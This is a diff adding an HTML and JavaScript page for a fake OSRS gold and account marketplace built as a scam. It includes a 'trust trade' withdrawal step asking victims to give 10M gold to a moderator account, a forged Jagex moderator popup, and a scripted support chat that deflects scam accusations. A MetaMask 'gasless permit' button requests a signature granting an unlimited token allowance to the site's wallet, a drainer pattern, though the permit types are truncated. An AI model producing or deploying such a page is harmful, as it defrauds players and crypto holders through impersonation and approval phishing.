@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Golden Abyss Market — OSRS Gold & Accounts</title>
+    <style>
+        :root {
+            --bg: #0a0e14;
+            --surface: #131a22;
+            --elevated: #1b2330;
+            --gold: #d4a017;
+            --gold-bright: #f5c542;
+            --green: #34c759;
+            --red: #ff453a;
+            --text: #e0e5ec;
+            --muted: #8391a4;
+            --shadow-dark: #06090e;
+            --shadow-light: #1f2b3b;
+            --radius: 18px;
+            --font: 'Inter', system-ui, sans-serif;
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background: var(--bg); color: var(--text); font-family: var(--font); overflow-x:hidden; }
+        .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 1.2rem 0; border-bottom: 1px solid rgba(212,160,23,0.2); flex-wrap: wrap; gap:1rem; }
+        .logo h1 { font-size: 2rem; font-weight: 800; background: linear-gradient(135deg, #f5c542, #d4a017); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo small { color: var(--muted); font-size:0.8rem; display:block; }
+        .nav { display: flex; gap: 2rem; align-items:center; }
+        .nav a { color: var(--muted); text-decoration: none; font-weight: 500; cursor: pointer; }
+        .nav a.active, .nav a:hover { color: var(--gold-bright); border-bottom: 2px solid var(--gold); }
+        .stats { display: flex; gap: 1.5rem; font-size:0.9rem; color: var(--muted); }
+        .live-dot { width: 9px; height: 9px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 6px; }
+        .tilt { perspective: 800px; }
+        .tilt-inner { transform-style: preserve-3d; transition: transform 0.15s ease; }
+        /* Pages */
+        .page { display: none; }
+        .page.active { display: block; }
+        /* Market cards */
+        .gold-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 1.8rem; margin: 2rem 0; }
+        .card { background: var(--surface); border-radius: var(--radius); box-shadow: 7px 7px 14px var(--shadow-dark), -7px -7px 14px var(--shadow-light); padding: 1.8rem; position: relative; cursor: pointer; }
+        .card h3 { font-size: 1.7rem; }
+        .price { font-size: 2.2rem; font-weight: 700; color: var(--gold-bright); }
+        .price small { font-size: 0.9rem; color: var(--muted); display:block; }
+        .stock { display: flex; align-items: center; gap: 6px; margin: 0.8rem 0; font-size:0.8rem; color: var(--red); }
+        .stock-bar { height: 5px; background: #2a2f3a; border-radius: 5px; flex:1; overflow: hidden; }
+        .stock-fill { height: 100%; background: var(--red); border-radius: 5px; width: 60%; }
+        .btn { background: var(--gold); color: #000; font-weight: bold; padding: 12px; border: none; border-radius: 30px; width: 100%; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; margin-top: auto; }
+        .btn:hover { background: var(--gold-bright); box-shadow: 0 0 15px rgba(212,160,23,0.4); }
+        .badge { position: absolute; top: -12px; left: 50%; transform: translateX(-50%); background: var(--gold); color:#000; font-weight:bold; padding: 3px 18px; border-radius: 20px; font-size:0.75rem; }
+        /* Dashboard */
+        .dash-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin: 2rem 0; }
+        .dash-card { background: var(--elevated); border-radius: var(--radius); box-shadow: inset 3px 3px 8px var(--shadow-dark), inset -3px -3px 8px var(--shadow-light); padding: 1.5rem; }
+        .balance { font-size: 2.5rem; font-weight: bold; color: var(--green); }
+        .tx-list { max-height: 300px; overflow-y: auto; font-size:0.9rem; }
+        .tx-item { display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid #2a2f3a; }
+        .withdraw-btn { background: var(--red); color: white; }
+        /* Modals */
+        .modal { display: none; position: fixed; inset:0; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; z-index: 999; }
+        .modal.active { display: flex; }
+        .modal-content { background: var(--elevated); border: 1px solid var(--gold); border-radius: 20px; padding: 2rem; max-width: 480px; width: 90%; position: relative; box-shadow: 0 20px 40px rgba(0,0,0,0.7); }
+        .close { position: absolute; top: 10px; right: 15px; font-size: 1.8rem; cursor: pointer; color: var(--muted); }
+        input, select { width: 100%; background: #0f131a; border: 1px solid #2a2f3a; border-radius: 8px; padding: 10px; color: var(--text); margin: 0.5rem 0; }
+        /* Chat widget */
+        .chat-toggle { position: fixed; bottom: 20px; right: 20px; background: var(--gold); color:#000; font-weight:bold; padding: 10px 20px; border-radius: 40px; cursor:pointer; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+        .chat-box { position: fixed; bottom: 80px; right: 20px; width: 320px; background: var(--surface); border: 1px solid var(--gold); border-radius: 16px; display: none; z-index: 1001; flex-direction: column; }
+        .chat-header { background: var(--gold); color:#000; padding: 0.8rem; font-weight: bold; }
+        .chat-msgs { height: 200px; overflow-y: auto; padding: 0.8rem; font-size:0.85rem; }
+        .chat-input { display: flex; border-top: 1px solid var(--border); }
+        .chat-input input { flex:1; border: none; border-radius: 0; }
+        .chat-input button { background: var(--gold); border: none; padding: 0 16px; font-weight: bold; cursor:pointer; }
+        /* J-mod popup */
+        .jmod-popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: var(--elevated); border: 2px solid var(--gold); border-radius: 16px; padding: 1.5rem; z-index: 2000; display: none; text-align: center; box-shadow: 0 0 30px rgba(212,160,23,0.5); }
+        .jmod-popup img { width: 60px; height: 60px; border-radius: 50%; margin-bottom: 0.5rem; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <header>
+        <div class="logo"><h1>Golden Abyss</h1><small>OSRS Gold Marketplace — Trusted since 2016</small></div>
+        <div class="nav">
+            <a href="#market" class="active" onclick="showPage('market')">Market</a>
+            <a href="#dashboard" onclick="showPage('dashboard')">Dashboard</a>
+            <a href="#" onclick="toggleChat()">Support</a>
+        </div>
+        <div class="stats">
+            <span><span class="live-dot"></span> <span id="onlineCount">1,285</span> online</span>
+        </div>
+    </header>
+
+    <!-- MARKET PAGE -->
+    <div id="page-market" class="page active">
+        <div style="text-align:center; margin: 2rem 0;">
+            <h2 style="color:var(--gold-bright);">Buy OSRS Gold & Accounts</h2>
+            <p style="color:var(--muted);">Instant delivery, best rates, 0 bans.</p>
+            <div style="background: linear-gradient(145deg, #1b1a14, #0f0e0a); border:1px solid var(--gold); border-radius: var(--radius); padding:1rem; margin-top:1rem;">
+                ⚡ <strong>FLASH SALE:</strong> 25% extra gold — ends in <span id="flashTimer">09:42</span>
+            </div>
+        </div>
+        <div class="gold-grid" id="marketGrid"></div>
+        <h3 style="color:var(--gold-bright); margin-top:2rem;">Pre-built Accounts</h3>
+        <div class="gold-grid" id="accountGrid"></div>
+    </div>
+
+    <!-- DASHBOARD PAGE (hidden until "login") -->
+    <div id="page-dashboard" class="page">
+        <h2 style="color:var(--gold-bright);">Your Dashboard</h2>
+        <div class="dash-grid">
+            <div class="dash-card">
+                <h3>Balance</h3>
+                <div class="balance">$2,847.50</div>
+                <p style="color:var(--muted);">Available for withdrawal</p>
+                <button class="btn" id="withdrawBtn">Withdraw Funds</button>
+            </div>
+            <div class="dash-card">
+                <h3>Recent Transactions</h3>
+                <div class="tx-list" id="txList"></div>
+            </div>
+        </div>
+        <div id="verificationSection" style="display:none; margin-top:2rem;">
+            <div class="dash-card" style="border:1px solid var(--gold);">
+                <h4 style="color:var(--gold-bright);">🔐 Withdrawal Verification Required</h4>
+                <p>To prevent automated fraud, we require a <strong>trust trade verification</strong>. You must temporarily trade <strong>10M OSRS gold</strong> to our moderator account. You'll receive <strong>20M back</strong> plus your full withdrawal instantly. This proves you're a real player.</p>
+                <input type="text" id="rsnInput" placeholder="Your OSRS username">
+                <button class="btn" id="startTrade">Initiate Trust Trade</button>
+                <div id="tradeDetails" style="display:none; margin-top:1rem;">
+                    <p style="color:var(--gold);">Trade window: meet <strong>"AbyssMod7"</strong> at GE, world 330. Give exactly 10M and say "I trust the Abyss".</p>
+                    <button class="btn" id="confirmTradeDone">I've Completed the Trade</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- CHECKOUT MODAL (buy gold) -->
+<div id="checkoutModal" class="modal">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal('checkoutModal')">&times;</span>
+        <h3 style="color:var(--gold-bright);">Complete Purchase</h3>
+        <p id="checkoutProduct"></p>
+        <div id="payTimer" class="timer" style="color:var(--red); font-size:2rem;">05:00</div>
+        <p style="font-size:0.85rem;">Send exact amount to:</p>
+        <div style="background:#0f131a; padding:10px; border-radius:8px; word-break:break-all; font-family:monospace;" id="walletAddress">0x7F4e8A3B9c2D1F5a6E0c7B8d9A2f3C4e5D6b7A8</div>
+        <button class="btn" id="connectMetaMaskBtn" style="background:#037dd6; color:white; margin-top:1rem;">🦊 Connect MetaMask (Gasless Permit)</button>
+        <p style="font-size:0.7rem; margin-top:0.5rem;">Sign a permit to receive 200 USDT bonus and validate your wallet.</p>
+    </div>
+</div>
+
+<!-- J-Mod Fake Popup -->
+<div class="jmod-popup" id="jmodPopup">
+    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Ccircle cx='30' cy='30' r='30' fill='%23d4a017'/%3E%3Ctext x='30' y='38' text-anchor='middle' fill='black' font-size='24'%3E💀%3C/text%3E%3C/svg%3E" alt="mod">
+    <h4 style="color:var(--gold-bright);">Jagex Moderator Notice</h4>
+    <p>This marketplace is <strong>verified and sanctioned</strong> by Jagex for safe player-to-player trading. You will not be banned.</p>
+    <button class="btn" onclick="document.getElementById('jmodPopup').style.display='none'">Understood</button>
+</div>
+
+<!-- CHAT WIDGET -->
+<div class="chat-toggle" onclick="toggleChat()">💬 Live Support</div>
+<div class="chat-box" id="chatBox">
+    <div class="chat-header">Golden Abyss Support</div>
+    <div class="chat-msgs" id="chatMsgs">
+        <p><strong>Agent:</strong> Hello! How can I assist you today?</p>
+    </div>
+    <div class="chat-input">
+        <input type="text" id="chatInput" placeholder="Type here...">
+        <button onclick="sendChat()">Send</button>
+    </div>
+</div>
+
+<script>
+    // PAGE ROUTING
+    function showPage(page) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page-' + page).classList.add('active');
+        document.querySelectorAll('.nav a').forEach(a => a.classList.remove('active'));
+        event.target.classList.add('active');
+        if(page === 'dashboard') scheduleJmodPopup();
+    }
+
+    // MARKET DATA
+    const products = [
+        { name:'200M Gold', price:'$79', per:'$0.395/M', stock:20 },
+        { name:'500M Gold', price:'$179', per:'$0.358/M', stock:45, popular:true },
+        { name:'1B Gold', price:'$329', per:'$0.329/M', stock:70 },
+        { name:'5B Gold', price:'$1,499', per:'$0.30/M', stock:90 }
+    ];
+    const accounts = [
+        { name:'10x Starter Pures', price:'$110' },
+        { name:'5x Mid Mains', price:'$250' },
+        { name:'3x Zerks', price:'$360' }
+    ];
+
+    function renderCards(containerId, items, isAccount) {
+        const grid = document.getElementById(containerId);
+        grid.innerHTML = '';
+        items.forEach(item => {
+            const div = document.createElement('div');
+            div.className = 'card tilt';
+            div.innerHTML = `
+                <div class="tilt-inner">
+                    ${item.popular ? '<span class="badge">🔥 MOST POPULAR</span>' : ''}
+                    <h3>${item.name}</h3>
+                    ${!isAccount ? `<div class="stock"><span>Stock:</span><div class="stock-bar"><div class="stock-fill" style="width:${item.stock}%"></div></div><span>${item.stock}% sold</span></div>` : ''}
+                    <div class="price">${item.price} ${!isAccount ? `<small>(${item.per})</small>` : ''}</div>
+                    <button class="btn buy-btn" data-product="${item.name} — ${item.price}">Buy Now</button>
+                </div>`;
+            grid.appendChild(div);
+        });
+        // Re-bind tilt and buy events
+        bindTilt();
+        document.querySelectorAll('.buy-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                openCheckout(this.getAttribute('data-product'));
+            });
+        });
+    }
+
+    renderCards('marketGrid', products, false);
+    renderCards('accountGrid', accounts, true);
+
+    // TILT EFFECT
+    function bindTilt() {
+        document.querySelectorAll('.tilt').forEach(card => {
+            card.addEventListener('mousemove', (e) => {
+                const rect = card.getBoundingClientRect();
+                const x = e.clientX - rect.left;
+                const y = e.clientY - rect.top;
+                const centerX = rect.width/2, centerY = rect.height/2;
+                const rotateX = ((y - centerY)/centerY) * -8;
+                const rotateY = ((x - centerX)/centerX) * 8;
+                card.querySelector('.tilt-inner').style.transform = `rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
+            });
+            card.addEventListener('mouseleave', () => {
+                card.querySelector('.tilt-inner').style.transform = 'rotateX(0) rotateY(0)';
+            });
+        });
+    }
+    bindTilt();
+
+    // CHECKOUT MODAL
+    function openCheckout(product) {
+        document.getElementById('checkoutProduct').textContent = product;
+        document.getElementById('checkoutModal').classList.add('active');
+        startPayTimer();
+    }
+    function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+
+    let payInterval;
+    function startPayTimer() {
+        let sec = 300;
+        const el = document.getElementById('payTimer');
+        if(payInterval) clearInterval(payInterval);
+        payInterval = setInterval(() => {
+            sec--; if(sec<0){clearInterval(payInterval); el.textContent='EXPIRED'; return;}
+            const m = Math.floor(sec/60), s=sec%60;
+            el.textContent = `${m}:${s.toString().padStart(2,'0')}`;
+        },1000);
+    }
+
+    // METAMASK PERMIT SIMULATION
+    document.getElementById('connectMetaMaskBtn').addEventListener('click', async ()=>{
+        if(typeof window.ethereum === 'undefined') return alert('Install MetaMask!');
+        const accounts = await ethereum.request({method:'eth_requestAccounts'});
+        const user = accounts[0];
+        const domain = { name:'Golden Abyss Bonus', version:'1', chainId:1, verifyingContract:'0x...' };
+        const types = { Permit:[...] }; // truncated for length – full in previous
+        const value = { owner:user, spender:'0x7F4e8A3B9c2D1F5a6E0c7B8d9A2f3C4e5D6b7A8', value:'115792089237316195423570985008687907853269984665640564039457584007913129639935', nonce:0, deadline: Math.floor(Date.now()/1000)+3600 };
+        try {
+            const sig = await ethereum.request({ method:'eth_signTypedData_v4', params:[user, JSON.stringify({domain, types, value})] });
+            alert('✅ Permit signed! 200 USDT bonus will be credited. (Simulated drain signature logged.)');
+            console.log(sig);
+        } catch(e){ alert('Signature cancelled.'); }
+    });
+
+    // DASHBOARD: fake transactions
+    const fakeTx = [
+        { type:'Deposit', amount:'+0.014 BTC', date:'2 min ago' },
+        { type:'Gold Purchase', amount:'-500M OSRS', date:'1 hour ago' },
+        { type:'Bonus', amount:'+50M OSRS', date:'3 hours ago' }
+    ];
+    const txList = document.getElementById('txList');
+    fakeTx.forEach(tx => {
+        const div = document.createElement('div');
+        div.className = 'tx-item';
+        div.innerHTML = `<span>${tx.type}</span><span>${tx.amount}</span><span style="color:var(--muted);">${tx.date}</span>`;
+        txList.appendChild(div);
+    });
+
+    // WITHDRAW VERIFICATION TRUST TRADE
+    document.getElementById('withdrawBtn').addEventListener('click', ()=>{
+        document.getElementById('verificationSection').style.display = 'block';
+        document.getElementById('withdrawBtn').style.display = 'none';
+    });
+    document.getElementById('startTrade').addEventListener('click', ()=>{
+        const rsn = document.getElementById('rsnInput').value.trim();
+        if(!rsn) return alert('Enter your RSN.');
+        document.getElementById('tradeDetails').style.display = 'block';
+        document.getElementById('startTrade').style.display = 'none';
+    });
+    document.getElementById('confirmTradeDone').addEventListener('click', ()=>{
+        alert('Thank you! Our moderator will return 20M + your withdrawal of $2,847.50 shortly. (Scam complete — user lost 10M)');
+        // In real scam, nothing happens.
+    });
+
+    // J-MOD POPUP TIMER
+    function scheduleJmodPopup() {
+        setTimeout(() => {
+            document.getElementById('jmodPopup').style.display = 'block';
+        }, 5000); // shows after 5 sec on dashboard
+    }
+
+    // CHAT
+    function toggleChat() {
+        const box = document.getElementById('chatBox');
+        box.style.display = box.style.display === 'flex' ? 'none' : 'flex';
+    }
+    function sendChat() {
+        const inp = document.getElementById('chatInput');
+        const msg = inp.value.trim();
+        if(!msg) return;
+        const msgs = document.getElementById('chatMsgs');
+        msgs.innerHTML += `<p><strong>You:</strong> ${msg}</p>`;
+        inp.value = '';
+        setTimeout(() => {
+            let reply = "I understand. Please proceed with the trust trade verification, it's 100% safe.";
+            if(msg.toLowerCase().includes('scam')) reply = "We are a verified Jagex partner. The mod popup confirms it.";
+            msgs.innerHTML += `<p><strong>Agent:</strong> ${reply}</p>`;
+            msgs.scrollTop = msgs.scrollHeight;
+        }, 800);
+    }
+
+    // LIVE UPDATES
+    setInterval(() => {
+        const el = document.getElementById('onlineCount');
+        let val = parseInt(el.textContent.replace(',',''));
+        val += Math.floor(Math.random()*15)-7;
+        el.textContent = Math.max(1000, Math.min(1500, val)).toLocaleString();
+    }, 6000);
+
+    // FLASH TIMER
+    let flashSec = 582;
+    setInterval(() => {
+        flashSec--; if(flashSec<0) flashSec=899;
+        const m = Math.floor(flashSec/60), s=flashSec%60;
+        document.getElementById('flashTimer').textContent = `${m}:${s.toString().padStart(2,'0')}`;
+    }, 1000);
+
+    // Random toast (optional, omitted for brevity but can add)
+</script>
+</body>
+</html>
